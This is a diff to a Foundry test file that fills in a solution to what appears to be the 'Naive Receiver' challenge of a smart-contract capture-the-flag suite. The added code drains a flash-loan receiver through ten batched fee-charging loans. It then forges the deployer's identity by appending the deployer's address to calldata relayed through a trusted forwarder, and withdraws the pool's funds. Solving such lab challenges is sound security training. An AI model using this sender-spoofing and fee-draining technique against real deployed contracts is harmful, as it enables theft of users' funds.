@@ -7,6 +7,8 @@ import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/Naive
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
 
+import {MessageHashUtils} from "openzeppelin-contracts/contracts/utils/cryptography/MessageHashUtils.sol";
+
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
@@ -77,7 +79,41 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        // Create data array for multicall() to call flashLoan() with receiver 10 times
+        bytes[] memory data = new bytes[](10);
+        for (uint256 i = 0; i < data.length; i++) {
+            data[i] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, address(weth), 0, bytes(""));
+        }
+
+        // Do multicall() with data array
+        pool.multicall(data);
+
+        // Construct Request struct for the forwarder to call multicall() on NaiveReceiverPool
+
+        // Create bytes[] array for the multicall() function and encode it as data for Request struct
+        bytes[] memory multicallData = new bytes[](1);
+        bytes memory withdrawCall = abi.encodeWithSelector(pool.withdraw.selector, pool.deposits(deployer), recovery);
+        multicallData[0] = abi.encodePacked(withdrawCall, address(deployer)); // the last 20 bytes == deployer
+
+        bytes memory _data = abi.encodeWithSelector(pool.multicall.selector, multicallData);
+
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 1e6,
+            nonce: forwarder.nonces(player),
+            data: _data,
+            deadline: block.timestamp + 100
+        });
+
+        // Create signature for the forwarder
+        bytes32 digest = MessageHashUtils.toTypedDataHash(forwarder.domainSeparator(), forwarder.getDataHash(request)); // EIP-712 digest
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // Call execute()
+        forwarder.execute(request, signature);
     }
 
     /**
